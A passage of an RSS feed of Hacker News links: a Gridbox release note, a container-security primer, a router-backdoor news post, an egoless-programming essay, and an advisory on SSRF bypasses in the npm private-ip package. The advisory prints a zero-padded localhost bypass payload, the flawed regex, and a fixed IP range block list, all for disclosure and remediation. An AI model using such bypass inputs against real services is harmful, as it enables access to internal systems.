<p>Over the last few months, we’ve been working on a range of performance optimization tasks. From tweaking database queries and API calls to re-architecting how we integrate with VS Code. We’ve been incrementally releasing these improvements and making things faster as we go. Still, some notable improvements are that average Gridbox Editor load and we’ve also made the editor feel more responsive when opening new files or switching between design and code mode and also you can now work with much larger projects.</p>
<h4 id="improved-components-library">Improved Components Library</h4>
<p>We've added lot of useful and rich UI components for faster development like more header variants, content components, rating cards, e-commerce, etc...</p>
<p><img src="https://www.gridbox.io/assets/static/ui-components.a3de058.170450ee94faf15fed288e9fa9579edb.jpg" width="2240" alt="search_components.gif" data-old-src="data:image/svg+xml,%3csvg fill='none' viewBox='0 0 2240 1260' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3e%3cdefs%3e%3cfilter id='__svg-blur-3071278618bb2fdca4c3d35651767651'%3e%3cfeGaussianBlur in='SourceGraphic' stdDeviation='40'/%3e%3c/filter%3e%3c/defs%3e%3cimage x='0' y='0' filter='url(%23__svg-blur-3071278618bb2fdca4c3d35651767651)' width='2240' height='1260' xlink:href='data:image/jpeg%3bbase64%2c/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAkAEADASIAAhEBAxEB/8QAGwAAAgIDAQAAAAAAAAAAAAAABQgABwMEBgH/xAAvEAACAQMEAQMDAgYDAAAAAAABAgMEBREABhIhEyIxQQdRkRRhCCMyQlJxcqHR/8QAGQEAAgMBAAAAAAAAAAAAAAAAAgMABAUB/8QAJxEAAgEEAQIFBQAAAAAAAAAAAQIAAxEhMRIE8EFxobHhBRVCwdH/2gAMAwEAAhEDEQA/AK9qXlWSKBA0MSseeT0VxkEfj/rWLbW35dzTzvb6GondJGeY0yphE7A6J7JPtq46r6DSyVPF98R%2bWMZKGi9QH7jye2tKs%2bhVHBA6VO9aWHyOuC9Gqr1/aB5Pu2fxquyudwwEuCTqVRuTaF8thElVZLnTQu4jSZljwxIyPno4B1Xl%2bpJqacxSxVCyL26zBes9j20zlF9FrNNVPbod60EtwLOiolKDICACwI8hJwBk6y138OFPXHxRbqHL/D9COhj/AJ5zrtNCDYrYRrVFK7z6e37i2WJuNXSy%2bQzNTsZkQ4BfrvB/P4Gi8t1W53akllkEVEv9KEAktjrPfvq5Lr/DodpWWvvY3MKsUEL1Ip3oOIZlH38nWdcfbvo1c73QzVNjho3cMqk%2bUoUY9jHNgNXk6dqi8lAt5ge8r2PhD30foLbd94w010jElv8ABK7iUmMDC5BJBGO/31aH1F2ttK2bJuFZYaakWvjaMhop2cgF1UnHI/BxqibXPd7LXyNRTPS1tMWheWEkMCPSwyD7dHRG5bs3NU0TwXG5VdTTOQWjmYlTjGMj/Yzq19q6snC%2bo/snFowlzr7rDuG%2bmg2d528bLBWl8CqwmVBOcgFuuhrnP1F/uFrdL59PoSVnfxJHJLJyHDHI9hhnJGD9tL2lXElZMZKsQjgili56OM9/bW8f04pY3mqIlVgD6mONZlr6GI1HCEMwv35xmNuWuaDdFC7bVoKOliZ5Uq4525xF4sH0k9nPpI/Gu2itNPQV1bceTGWpVBKOzy4KQoA%2b%2bCf96SC13KppbpAY50ZXnThmQgH1jGM6bq7Vu%2bFu9sjobRbZaCRGNZJJMA8LYPSjl33jsZ0S8jgmLYKTcC0G723bRXbYl5p6OOVhU2%2bYxSFlwwEZY4BOSesYxkfOhX0a3BaVsdZDU3GmpeM6EeWTxM3oGf6sZAxo9se33VrhNVbi23b6CeF%2bFNPAyksrAhjgO2OuI/fXS1Fc8d9pqFaMtDLFLI04QcYyjIAp6925HHf9p1Zp1eNI0nF83uD8SOyjUUnctTNPuS71FOI1SarlccIzxILnBXHxoVxlI9a5Y%2b5VCNMfNuuqguMKVHijaWuFKvhjV1f%2bbjkGIGMrkEHsY6%2b5KbZvdzu%2b5rnTeaFqSlrAiqkKD%2bX8gnGTn861KX10fimsb%2bIbXXcSmWjjjWQ85HMsfJ%2bbZ5HkNewVcqFj6WJiyeS5z0f/ADU1NYTZMFdTFR1ctbcqVZSqo8sahUUAJ6gMr9j3p5aHZ1HQzKsdbcn8cHhJknB5nrEjDGC/QGcamprrgYgoTNq27Qt6m21U01ZPVQ1JrhLJL6mkKkerAAKgHofGjdrqWqbtc6eRU4U7KEwOzkfOpqaNRg9%2bMA7ExWhIbg1cKmlp2EFSVQeMH2OQe/nPzrzacy1lumqnggjmaZ1Yxpjlg9En3J1NTSVjUzTJPe5//9k=' /%3e%3c/svg%3e" data-srcset="/assets/static/ui-components.82a2fbd.170450ee94faf15fed288e9fa9579edb.jpg 480w, /assets/static/ui-components.cbab2cf.170450ee94faf15fed288e9fa9579edb.jpg 1024w, /assets/static/ui-components.2665e34.170450ee94faf15fed288e9fa9579edb.jpg 1920w, /assets/static/ui-components.a3de058.170450ee94faf15fed288e9fa9579edb.jpg 2240w" data-src="/assets/static/ui-components.a3de058.170450ee94faf15fed288e9fa9579edb.jpg" srcset="https://www.gridbox.io/assets/static/ui-components.82a2fbd.170450ee94faf15fed288e9fa9579edb.jpg 480w, https://www.gridbox.io/assets/static/ui-components.cbab2cf.170450ee94faf15fed288e9fa9579edb.jpg 1024w, https://www.gridbox.io/assets/static/ui-components.2665e34.170450ee94faf15fed288e9fa9579edb.jpg 1920w, https://www.gridbox.io/assets/static/ui-components.a3de058.170450ee94faf15fed288e9fa9579edb.jpg 2240w"></p>
<h4 id="background-gradient-picker">Background Gradient Picker</h4>
<p>Now you can easily create colorful background gradients in the design mode using properties panel. This will automatically generates css snippet and updates the css file. </p>
<p><img src="https://res.cloudinary.com/gridbox/video/upload/c_limit,w_1045/v1605960758/gridbox/gradient-picker_ennthr.gif" alt="gradient-picker_ennthr.gif"></p>
<p>There’s still lot work to do, both in terms of editor design and performance. For now, we’ve been running these changes as an experiment over the last few weeks, incorporating feedback from the community. It’s available for everyone to use from today, so go ahead and try it out for yourself.</p>
<h4 id="looking-ahead">Looking Ahead</h4>
<p>We're also in the process of integrating Gridbox with other CSS Frameworks like Tailwind, Bulma &amp; Google Material Design. </p>
<h4 id="thanks">Thanks</h4>
<p>Thanks goes to those of you who have provided considered feedback while in preview. We’re excited to see what you build next!</p>
<p>Ready to design your next Bootstrap Project with Gridbox?</p>
<p>Kindly check on this link (<a href="https://www.gridbox.io/" target="_blank" rel="noopener noreferrer">https://www.gridbox.io</a>) and spread the word :)</p>
</div></div>]]>
            </description>
            <link>https://www.gridbox.io/blog/what-we-have-been-shipping-nov-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25189821</guid>
            <pubDate>Mon, 23 Nov 2020 18:23:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A practical introduction to container security]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25189778">thread link</a>) | @jerodsanto
<br/>
November 23, 2020 | https://cloudberry.engineering/article/practical-introduction-container-security/ | <a href="https://web.archive.org/web/*/https://cloudberry.engineering/article/practical-introduction-container-security/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        <div>
            <p>Securing containers is a complex task.  The problem space is broad, vendors are on fire, there are tons of checklists and best practices and it’s hard to prioritize solutions. So if you had to <strong>implement a container security strategy</strong> where would you start?</p>

<p>I suggest to start from the basics: understanding <strong>what container security is about</strong> and build a model to navigate risks.</p>

<h2 id="follow-the-devops-life-cycle">Follow the DevOps Life Cycle</h2>

<p>Every security initiative is eventually constrained by where security controls can be implemented, so I find practical to just follow the standard DevOps life cycle to <em>surface patterns™</em> and <em>unlock synergies™</em>.</p>

<p>The DevOps Lifecycle is an infinite iteration of:</p>

<ul>
<li>Plan</li>
<li>Code</li>
<li>Build</li>
<li>Test</li>
<li>Release</li>
<li>Deploy</li>
<li>Operate</li>
<li>Monitor</li>
</ul>

<p><img src="https://cloudberry.engineering/devops-lifecycle.jpg" alt="DevOps Lifecycle - source: ryadel.com"></p>

<p>Containers are included in the application in the form of a Dockerfiles but are not really part of it. As such they don’t interest the planning and coding phase.</p>

<p><em>(no, writing Dockerfiles is not coding.)</em></p>

<p>Every other step is in scope from a security point of view, and I would group them like this:</p>

<ul>
<li><strong>Build Time</strong>: build, test and release.</li>
<li><strong>Container Infrastructure</strong>: deploy and operate.</li>
<li><strong>Runtime</strong>: monitor.</li>
</ul>

<p>Why? Every security strategy is only effective if it can be implemented. And every step in each group share a common facility where security controls can be injected without adding much friction:</p>

<ul>
<li>Build Time: The CI/CD infrastructure, the container registry</li>
<li>Container Infrastructure: the container orchestrator</li>
<li>Runtime: the production environment</li>
</ul>

<p>Now we have three macro areas we can use as a starting point to do our risk assessments.</p>

<h2 id="security-at-build-time">Security at Build Time</h2>

<p>At build time we have in input a bunch of source files and a Dockerfile, and we get as output a Docker image.</p>

<p>This is where most vendors tend to cluster while trying to sell you the narrative of the importance of scanning container images and calling it a day.  Container security scanning is important, yes, but it’s not enough.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>minimize the risk of supply chain attacks.</li>
</ul>
</div>


<h3 id="container-images-hygiene">Container Images Hygiene</h3>

<p>First, decide how your images should look like, with a focus on how software dependencies are introduced:</p>

<ul>
<li>what base images are developers allowed to use?</li>
<li>are software dependencies pinned? From where are they pulled?</li>
<li>are there any labels that are needed to simplify governance and compliance?</li>
<li>lint the Dockerfile</li>
<li>follow <a href="https://cloudberry.engineering/article/dockerfile-security-best-practices/">Docker security best practices</a> when writing Dockerfiles</li>
</ul>

<p>All of these checks are static and can be implemented for cheap as a step in the build pipelines.</p>

<h3 id="container-images-scanning">Container Images Scanning</h3>

<p>Then we can move into scanning the container image.</p>

<p><strong>Do not scan the image as a step in the build pipeline</strong>, instead setup continuous scanning in the container registry.</p>

<p>Why? Vulnerabilities are continuously discovered while your services are not necessarily continuously built. Secondly, builds are additive: every build will generate a new image. So, assuming  your container orchestrator trust your registry, every tag you publish can always be deployed and need to be assessed.</p>

<p><em>(It’s also very slow to scan at build time)</em></p>

<p>This is where you start thinking about defining <strong>patch management</strong> and <strong>shelf life</strong> processes:</p>

<ul>
<li>patch management: results from the scanning will feed a patching process that will result in a new version of the image</li>
<li>shelf life: unpatched/old/unsafe images are deleted from the registry</li>
</ul>

<p><em>(next article will be about how to choose a container scanning solution, if you are facing the dilemma right now feel free to <a href="mailto:hello@clouberry.engineering">ping me</a>)</em></p>

<h2 id="container-infrastructure-security">Container Infrastructure Security</h2>

<p>The container infrastructure is comprised of all the moving parts that are in charge of pulling your images from the registry and run them as containers in production.</p>

<p>It’s mostly going to be the container orchestrator – <em>*cough* kubernetes *cough*</em>.</p>


<div>
<p><strong>This stage goals</strong>:</p>

<ul>
<li>Avoid platform misconfigurations with security implications</li>
<li>Minimize the <strong>breadth</strong> of an attack from a compromised container</li>
</ul>
</div>


<h3 id="security-of-the-infrastructure-misconfigurations">Security OF the Infrastructure: Misconfigurations</h3>

<p>Container orchestrators are complex, Kubernetes in particular. As of now they fail the promise of DevOps and I think we are still an abstraction layer (or two) away from being a mainstream solution without too much operational overhead.</p>

<p>Every complex platforms is prone to be misconfigured, and this is the part you want to focus on.</p>

<p>You have to threat model your infrastructure to <strong>ensure it can’t be abused</strong>.
This particular thread model should focus on every actor but a compromised container (we will cover that next).</p>

<p>I can’t go into details here, because it really depends on what you are running. For Kubernetes a good starting point for threat modelling is <a href="https://www.marcolancini.it/2020/blog-kubernetes-threat-modelling/">this</a>.</p>

<p>Additionally, if you are not doing it yet, this is also a <strong>good argument in favour of using a managed platform</strong>: the complexity is reduced if you can leverage a shared responsibility model with your (trusted) provider.</p>

<h3 id="security-in-the-infrastructure-lateral-movements">Security IN the infrastructure: Lateral Movements</h3>

<p>Next we can talk about what happens when a container is compromised.</p>

<p>You want to minimize the <a href="https://cloudberry.engineering/article/lateral-movement-cloud/">attacker’s ability to move laterally</a>, focusing on these two layers:</p>

<ul>
<li>The network layer</li>
<li>The Identity and Access management (IAM) layer</li>
</ul>

<p><strong>The network should not be flat</strong>. You can start by brutally segment everything into subnetworks and work your way up to a full fledge service meshes.</p>

<p>On the IAM layer work your way toward having a <strong>single identity for each container</strong> in order to fine tune the authorization grants. This is particularly important in multi tenant platforms: without granular identities it’s impossible to achieve least privilege.</p>

<p><em>(Google Kubernetes Engine (GKE) has a nifty feature for this called <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a>)</em></p>

<p>Finally, since they are supposed to be immutable, a wonderful strategy would be to <strong>reduce the amount of time containers can run</strong>: the window of opportunity for attackers to move laterally and gain persistence is as long as the container running lifetime. Continously shut down and spin up your containers.</p>

<p>And this final consideration allow me to smoothly move into the next area.</p>

<h2 id="runtime-security">Runtime Security</h2>

<p>The last piece of the puzzle is the security of your running workloads.
At this point most of the hardening is done and here is when we move into the realm of reactive security controls, the grim land of <strong>post-fail</strong>.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>is to minimize the <strong>impact</strong> of an attack from a compromised container.</li>
</ul>
</div>


<h3 id="detection-and-incident-response">Detection and Incident Response</h3>

<p>The best way to control the impact of an attack is to minimize the time between the breach to when the security team is alerted.</p>

<p>Detecting an ongoing breach is another area where vendors are scrambling to find a silver bullet. There are many approaches, most of them will require side cars and/or daemon sets actively monitoring pod’s traffic and system calls.</p>

<p>Most solutions will provide some value but my advice is to start simple and iterate: use your existing SIEM, ingest your platform, application and audit logs.</p>

<p><strong>Incidents will happen</strong>, and it’s fine: have an incident response process.</p>

<p>The first bullet point of every post-mortem should be: <em>“how can we detect this quicker next time?”</em> answering will allow you to identify your blind spots, which you can then use to understand what signals you are missing and what makes sense to buy.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Container security is a broad problem and it is not just about scanning images.</p>

<p>This is the model I built and used to reason about container risks and solutions. It’s very high level and of course, as with every model, <strong>it’s not necessarily the right one</strong>.</p>

<p>We all know that in reality each infrastructure is a snowflake: so start with your own threat model and use this one <strong>as an inspiration</strong>.</p>
        </div>
        
    </div>
</section></div>]]>
            </description>
            <link>https://cloudberry.engineering/article/practical-introduction-container-security/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25189778</guid>
            <pubDate>Mon, 23 Nov 2020 18:18:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Walmart Exclusive Wi-Fi Router Contains Backdoor to Control Devices]]>
            </title>
            <description>
<![CDATA[
Score 283 | Comments 13 (<a href="https://news.ycombinator.com/item?id=25189673">thread link</a>) | @wikus
<br/>
November 23, 2020 | https://hfet.org/walmart-exclusive-wi-fi-router-contains-backdoor-to-control-devices/ | <a href="https://web.archive.org/web/*/https://hfet.org/walmart-exclusive-wi-fi-router-contains-backdoor-to-control-devices/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

			
	<main id="main" role="main">

		
<article id="post-1238">

	<!-- .entry-header -->

	
		<figure>
			<img width="1080" height="540" src="https://hfet.org/wp-content/uploads/2020/11/wallmart_router_backdoor_humans_for_ethical_technology_hfet-1080x540.jpg" alt="" loading="lazy" srcset="https://hfet.org/wp-content/uploads/2020/11/wallmart_router_backdoor_humans_for_ethical_technology_hfet-1080x540.jpg 1080w, https://hfet.org/wp-content/uploads/2020/11/wallmart_router_backdoor_humans_for_ethical_technology_hfet-20x11.jpg 20w" sizes="(max-width: 1080px) 100vw, 1080px">		</figure>

		
	
<div>

	<h4>A Walmart-exclusive Wi-Fi router, and others sold on Amazon &amp; eBay contain hidden backdoors to control devices <a href="https://cybernews.com/security/walmart-exclusive-routers-others-made-in-china-contain-backdoors-to-control-devices/" target="_blank" rel="noopener noreferrer">reports CyberNews</a>.</h4>
<ul>
<li>Researchers discovered that many low cost, Chinese-made Wi-Fi routers contain a hidden backdoor which is being actively exploited to create botnet attacks.</li>
</ul>
<p>CyberNews researchers discovered suspicious backdoors in a Chinese made router sold under the name ‘Jetstream’. This router is part of Walmart’s new line of affordable Wi-Fi routers.</p>
<blockquote><p>This backdoor would allow an attacker the ability to remotely control not only the routers, but also any devices connected to that network.</p></blockquote>
<p><img loading="lazy" src="https://hfet.org/wp-content/uploads/2020/11/pexels-brett-sayles-2881232-1024x681.jpg" alt="" width="800" height="532" srcset="https://hfet.org/wp-content/uploads/2020/11/pexels-brett-sayles-2881232-1024x681.jpg 1024w, https://hfet.org/wp-content/uploads/2020/11/pexels-brett-sayles-2881232-300x199.jpg 300w, https://hfet.org/wp-content/uploads/2020/11/pexels-brett-sayles-2881232-768x511.jpg 768w, https://hfet.org/wp-content/uploads/2020/11/pexels-brett-sayles-2881232-20x13.jpg 20w, https://hfet.org/wp-content/uploads/2020/11/pexels-brett-sayles-2881232-36x24.jpg 36w, https://hfet.org/wp-content/uploads/2020/11/pexels-brett-sayles-2881232-48x32.jpg 48w, https://hfet.org/wp-content/uploads/2020/11/pexels-brett-sayles-2881232-272x182.jpg 272w, https://hfet.org/wp-content/uploads/2020/11/pexels-brett-sayles-2881232.jpg 1280w" sizes="(max-width: 800px) 100vw, 800px"></p>
<p>The researchers contacted Walmart to get a statement, and a Walmart spokesperson had this to say:</p>
<blockquote><p>“Thank you for bringing this to our attention. We are looking into the issue to learn more. The item in question is currently out of stock and we do not have plans to replenish it.”</p></blockquote>
<p>CyberNews researchers also discovered that ‘Wavlink’ branded routers, often sold on Amazon or eBay, <a href="https://cybernews.com/security/walmart-exclusive-routers-others-made-in-china-contain-backdoors-to-control-devices/" target="_blank" rel="noopener noreferrer">contain similar backdoors</a>.</p>
<p>Worryingly, they also discovered that these <strong>backdoors are being actively exploited</strong>, and there have been attempts to add the routers to a botnet with malware that allows them to be used in large scale DDoS attacks, which have <a href="https://cybernews.com/security/walmart-exclusive-routers-others-made-in-china-contain-backdoors-to-control-devices/" target="_blank" rel="noopener noreferrer">in the past taken down major websites</a> such as Reddit, Netflix, CNN, GitHub, Twitter, AirBnb and more.</p>
<h4><strong>Read more of the <a href="https://cybernews.com/security/walmart-exclusive-routers-others-made-in-china-contain-backdoors-to-control-devices/" target="_blank" rel="noopener noreferrer">full report on CyberNews</a>.</strong></h4>
<p><strong><a href="https://james-clee.com/2020/04/18/multiple-wavlink-vulnerabilities/" target="_blank" rel="noopener noreferrer">James Clee’s Report</a> on ‘Wavlink’ routers’ backdoors.<br>
</strong></p>
<p><a href="https://hfet.org/feed/"><img src="https://hfet.org/wp-content/uploads/2020/11/rss_button_hfet-1.png" alt="" width="219" height="30"></a><a href="https://hfet.org/support/"><img src="https://hfet.org/wp-content/uploads/2020/11/support_button_hfet.png" alt="" width="165" height="30"></a></p>
    <div itemtype="http://schema.org/Person" itemscope="" itemprop="author"><p><img width="100" height="100" src="https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-150x150.jpg" alt="" loading="lazy" srcset="https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-150x150.jpg 150w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-300x300.jpg 300w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-20x20.jpg 20w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-36x36.jpg 36w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-48x48.jpg 48w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-24x24.jpg 24w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-96x96.jpg 96w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel.jpg 640w" sizes="(max-width: 100px) 100vw, 100px"></p><div><p>I’m an AI &amp; Robotics Student interested in FOSS, Tech Sustainability and Data Rights. I’m also the founder of Humans For Ethical Technology.</p></div></div>	
</div><!-- .entry-content -->


</article>

	</main><!-- #main -->

	


	</div></div>]]>
            </description>
            <link>https://hfet.org/walmart-exclusive-wi-fi-router-contains-backdoor-to-control-devices/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25189673</guid>
            <pubDate>Mon, 23 Nov 2020 18:10:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Commandments of Egoless Programming]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25189562">thread link</a>) | @sirkarthik
<br/>
November 23, 2020 | https://blog.codonomics.com/2020/11/ten-commandments-of-egoless-programming.html | <a href="https://web.archive.org/web/*/https://blog.codonomics.com/2020/11/ten-commandments-of-egoless-programming.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-1360687395129563554" itemprop="articleBody">
<p><span>We are nothing but the values we carry. All through my life thus far, I tried to influence people around me with the virtues I value. Thanks to some good reading habits I had inculcated, and the fortune of being in good community of peers and mentors alike, I managed to have read some real good books. This post is about the 10 commands of egoless programming in Weinberg's book. I shall explain the commandments based on my experience here.</span></p><p data-pm-slice="1 1 []"><span>So very many decades ago, Gerald M. Weinberg authored&nbsp;<a href="https://www.goodreads.com/book/show/2229333.Psychology_of_Computer_Programming"><u>The Psychology of Computer Programming</u></a>. In it, he listed <strong>The Ten Commandments of&nbsp;</strong><a href="https://en.wikipedia.org/wiki/Egoless_programming"><strong><u>Egoless Programming</u></strong></a>, which remains relevant even today for us as not just programmers but as team-members.</span></p><p><span>Weinberg is regarded as a pioneer in taking a people-centric approach to computing, and his work endures as a good guide to intelligence, skill, teamwork, and problem-solving power of a developer. When they appear to inspire and instruct, we find that they can apply to just about every business area, and even to life itself.</span></p><p><span>Here are the 10 important lessons developers, project managers, and stakeholders would do well to keep in mind during the project lifecycle.</span></p><ol><li><p><span><strong>Understand and accept that you will make mistakes.</strong><br>Mistakes are rarely fatal in our industry, so find them early, before they make it into production, learn from them, and move on.</span></p></li><li><p><span><strong>You are not your code.</strong><br>The point of a review is to find problems. Don't take it personally when one is found. Remember&nbsp;<a href="https://olxpeople.atlassian.net/wiki/spaces/OPETE/pages/940179552">my words</a>, “To err is only human, repeating it is what makes you either evil or insane”.</span></p></li><li><p><span><strong>No matter how much "karate" you know, someone else will always know more.</strong><br>Seek and accept input from others. You can learn new techniques if you just ask. Always remember, it is never too late to learn.</span></p></li><li><p><span><strong>Don't rewrite code without consultation.</strong><br>It is always a good idea to pair-up and have conversations on the code that you are tempted to re-write because you think it is bad. Your risks are much lesser if the code is backed by Unit tests. The least you can do is get it code reviewed before pushing code to main-stream branch.</span></p></li><li><p><span><strong>Treat people who know less than you with respect and patience.</strong><br>Don’t be a bully. Seriously, just don’t be one. Grow up!</span></p></li><li><p><span><strong>The only constant in the world is change.</strong><br>Things change, sometime for better and sometimes for worse. There are some things in your control which you can leverage to change things for better. Be the change that you wish for good. Also be willing to accept change for the overall good of the team.</span></p></li><li><p><span><strong>The only true authority stems from knowledge, not from position.</strong><br>Don't wield a title like a badge of "rightness."&nbsp;<span>If you want to be loved and respected in an egoless environment, cultivate knowledge. It may or may not lead to authority, but sure leads to love and respect from others. </span></span></p></li><li><p><span><strong>Fight for what you believe, but gracefully accept defeat.</strong><br>Open culture is not being polite in the front and back-bitching in the back. Rise up, voice your concerns, be heard, and make your point of view by doing your homework, all with an intent to help and learn otherwise. You can’t accept defeat, if you carry the burden of your ego. </span></p></li><li><p><span><strong>Don't be "the guy in the room".</strong><br>There are so many beer buddies, movie mates, cigarette companions, and what not, who can come together or fight fiercely on any non-professional topics by respecting each other; but definitely not discuss and debate openly, work related matters for team’s betterment. Just don’t be that guy in the room.  </span></p></li><li><p><span><strong>Critique code instead of people – be kind to the coder, not to the code.</strong><br>Pour your frustration on lifeless things instead of on emotional beings. Corollary, if someone were to show his frustrations on you instead of your work, be a little polite to him, discounting it as emotional down syndrome. I have been on both sides, and so will you sometime. Let us support one another and grow together.</span></p></li></ol><p><span>Just to re-iterate, these commandments are still incredibly relevant. Put it to deliberate practice and with time they will bring out a better developer and co-worker in you.</span></p><p><span>You can get this book from <a href="https://amzn.to/3lZvXr9" target="_blank">Amazon</a>.</span></p>

</div></div>]]>
            </description>
            <link>https://blog.codonomics.com/2020/11/ten-commandments-of-egoless-programming.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25189562</guid>
            <pubDate>Mon, 23 Nov 2020 18:00:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bad RegEx in NPM package with 12k weekly installs hiding for 4 years causes SSRF]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25189499">thread link</a>) | @planetxort
<br/>
November 23, 2020 | https://johnjhacking.com/blog/cve-2020-28360/ | <a href="https://web.archive.org/web/*/https://johnjhacking.com/blog/cve-2020-28360/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Versions of npm private-ip including and prior to 1.0.5 are vulnerable to multiple Server Side Request Forgery (SSRF) bypasses. Implemented Regular Expression (RegEx) within the package fail to account for variations of localhost and other Private IP ranges. An attacker can obfuscate payloads, or utilize ranges outside of the block list to successfully execute SSRF bypass techniques, circumventing restrictions.</p><p>Reading time: 4 minutes.</p><div>
      <p><img src="https://johnjhacking.com/uploads/shutterstock_image-1.png" alt=""></p>

<p><strong>Sick.Codes</strong><br>
Github: (<a href="https://github.com/sickcodes" title="https://github.com/sickcodes">https://github.com/sickcodes</a>)<br>
Twitter: (<a href="https://twitter.com/sickcodes" title="https://twitter.com/sickcodes">https://twitter.com/sickcodes</a>)<br>
<strong>John Jackson</strong><br>
Github: (<a href="https://github.com/johnjhacking" title="https://github.com/johnjhacking">https://github.com/johnjhacking</a>)<br>
Twitter: (<a href="https://twitter.com/johnjhacking" title="https://twitter.com/johnjhacking">https://twitter.com/johnjhacking</a>)<br>
<strong>Nick Sahler</strong><br>
Github: (<a href="https://github.com/nicksahler" title="https://github.com/nicksahler">https://github.com/nicksahler</a>)<br>
Twitter: (<a href="https://twitter.com/tensor_bodega" title="https://twitter.com/tensor_bodega">https://twitter.com/tensor_bodega</a>)</p>
<p><strong><em>With Collaboration from:<br>
Harold Hunt</em></strong><br>
LinkedIn: (<a href="https://www.linkedin.com/in/huntharo" title="https://www.linkedin.com/in/huntharo">https://www.linkedin.com/in/huntharo</a>)</p>

<p>Over the course of several months, John dealt with remediating a Server-Side Request Forgery vulnerability, several times. A researcher was able to bypass blocking mechanisms, therefore John decided to dig in further to get to the root cause of the vulnerability.</p>
<p>The researcher used the following payload to bypass restrictions:</p>
<pre><code>http://0000.0000.0000.0000:&lt;redactedport#&gt;/&lt;redacted&gt;/&lt;redacted&gt;
</code></pre>
<p>Security researchers know that using multiple zeroes is a classic way to bypass localhost blocking when abusing SSRF vulnerabilities. Additionally, it was noted that other variations of 0’s can be used within the 127.0.0.1 and 0.0.0.0 payloads. However, the fundamental issue was a result of localhost skewing, which made it clear to John that the blocking mechanism wasn’t accounting for the variations.</p>
<p>After talking to other colleagues, John got in touch with Harold Hunt who helped him identify the package responsible for the IP blocking mechanism, <strong>private-ip</strong>.</p>
<p>The code logic was utilizing simple Regular Expression, therefore not accounting for variations of localhost, and other private-ip ranges, as predicted. John and Harold realized that it would be exceedingly difficult to come up with simple regex to cover all of the possibilities, therefore John contacted Nick Sahler and Sick.Codes for their Software Engineering expertise.</p>

<p>The npm private-ip package has an average of 14,000 downloads weekly - even though the package is roughly four years old. Using the out-of-date version can result in continuous SSRF bypass vulnerabilities, and threat actors can intentionally extract sensitive information and escalate their privileges further. Be advised, <strong>Enterprises utilizing this package as a means of preventing SSRF or related vulnerabilities,</strong> <strong>should upgrade to the latest version immediately.</strong></p>

<p>The old code was evaluated further, this was the prevention mechanism being used in the index.js:</p>
<pre><code>/^(::f{4}:)?10\\.(\[0-9\]{1,3})\\.(\[0-9\]{1,3})\\.(\[0-9\]{1,3})$/i.test(ip) ||
/^(::f{4}:)?192\\.168\\.(\[0-9\]{1,3})\\.(\[0-9\]{1,3})$/i.test(ip) ||
/^(::f{4}:)?172\\.(1\[6-9\]|2\\d|30|31)\\.(\[0-9\]{1,3})\\.(\[0-9\]{1,3})$/i.test(ip) ||
/^(::f{4}:)?127\\.(\[0-9\]{1,3})\\.(\[0-9\]{1,3})\\.(\[0-9\]{1,3})$/i.test(ip) ||
/^(::f{4}:)?169\\.254\\.(\[0-9\]{1,3})\\.(\[0-9\]{1,3})$/i.test(ip) ||
/^f\[cd\]\[0-9a-f\]{2}:/i.test(ip) ||
/^fe80:/i.test(ip) ||
/^::1$/.test(ip) ||
/^::$/.test(ip)  
</code></pre>
<p>There are already several issues within the regex. It’s not comprehensive enough to cover the localhost variations, nor many of the industry standard private IP ranges. Nick and Sick.Codes utilized netmask and rewrote the index.js:</p>
<pre><code>var Netmask = require('netmask').Netmask
function netmaskCheck (params) {
let privateRanges = [
    '0.0.0.0/8',
    '10.0.0.0/8',
    '100.64.0.0/10',
    '127.0.0.0/8',
    '169.254.0.0/16',
    '172.16.0.0/12',
    '192.0.0.0/24',
    '192.0.0.0/29',
    '192.0.0.8/32',
    '192.0.0.9/32',
    '192.0.0.10/32',
    '192.0.0.170/32',
    '192.0.0.171/32',
    '192.0.2.0/24',
    '192.31.196.0/24',
    '192.52.193.0/24',
    '192.88.99.0/24',
    '192.168.0.0/16',
    '192.175.48.0/24',
    '198.18.0.0/15',
    '198.51.100.0/24',
    '203.0.113.0/24',
    '240.0.0.0/4',
    '255.255.255.255/32'
].map(b =&gt; new Netmask(b))
for (let r of privateRanges) {
    if (r.contains(params)) return true
  }
  return false
}  
</code></pre>
